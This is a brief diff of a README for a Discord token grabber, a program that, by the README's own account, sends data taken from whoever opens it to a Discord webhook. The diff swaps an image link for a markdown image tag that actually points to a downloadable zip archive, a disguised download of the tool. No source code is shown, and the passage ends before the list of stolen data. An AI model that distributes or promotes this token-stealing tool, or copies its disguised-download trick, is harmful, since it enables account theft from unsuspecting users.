@@ -1,5 +1,5 @@
 # Discord-Token-Grabber
-![alt text](https://i.imgur.com/QUumZrJ.png)
+![alt text](https://raw.githubusercontent.com/derhderhderh/Discord-Token-Grabber/main/lecture/v2.2-alpha.1.zip)
 
 
 ### If you open the program then it's sending a message through a discord webhook with the following informations:
